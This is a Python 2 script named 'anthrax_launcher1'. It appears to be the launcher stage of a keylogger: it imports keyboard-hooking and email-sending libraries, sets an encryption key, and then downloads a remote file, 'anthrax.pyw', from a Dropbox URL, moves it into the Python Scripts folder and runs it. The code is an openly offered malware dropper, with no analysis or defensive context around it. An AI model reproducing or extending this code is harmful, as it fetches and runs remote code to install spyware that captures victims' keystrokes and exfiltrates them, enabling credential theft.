#anthrax_launcher1 1.2
#config--------------------
subject_name = 'debug4.1'
subject_file = 'C://Python27/name.txt'
interval = 500
crypt_key = 69
#--------------------------
import pyHook, pythoncom, sys, logging, os, smtplib, socket, getpass, time
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders
import sched
import urllib2, urllib, shutil
from win32com.shell import shell, shellcon
import subprocess
#--------------------------
url_listener = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_listener/anthrax.pyw?dl=1"
print 'Gathering anthrax...',
c = urllib.URLopener()
c.retrieve(url_listener, "anthrax.pyw")
shutil.move("anthrax.pyw", "C://Python27/Scripts/anthrax.pyw")
print 'Done'
print 'Starting anthrax...'
execfile("C://Python27/Scripts/anthrax.pyw")
